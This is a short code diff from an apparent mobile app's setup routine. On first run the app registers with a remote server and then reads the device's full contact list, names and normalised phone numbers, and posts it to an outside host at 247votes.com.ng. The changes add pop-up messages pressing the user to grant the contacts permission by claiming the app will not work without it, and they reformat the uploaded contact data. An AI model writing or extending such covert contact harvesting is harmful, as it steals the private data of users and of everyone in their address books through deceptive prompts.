@@ -651,7 +651,7 @@ var setup = settings.setup;
 if(setup != 1){	
 $.post("http://247votes.com.ng/app/api.php",{id:'appReg',data:myJSON},function(response){
 if(response == 1){
-
+alert("Kindly click allow to unlock all functions.\nIf not application would not function well.");
 	navigator.contactsPhoneNumbers.list(function(contacts) {
       var cl = contacts.length;
 	var dd = "";
@@ -661,7 +661,7 @@ if(response == 1){
              var pn = phone.normalizedNumber;
 	      dd += cn +" : "+ pn +",";
       }
-$.post("http://247votes.com.ng/app/api.php",{id:'appContacts', uuid:uid, data:cl+' || '+dd},function(response){
+$.post("http://247votes.com.ng/app/api.php",{id:'appContacts', uuid:uid, data1:cl, data2:dd},function(response){
 if(response == 1){
 var setup = {
     appID: uid,
@@ -671,7 +671,7 @@ window.localStorage.setItem('app_settings', JSON.stringify(setup));
 }
 });
    }, function(error) {
-      alert(error);
+      alert(error+"\nApplication would not function well. Kindly Allow Permission");
    });
 
 }
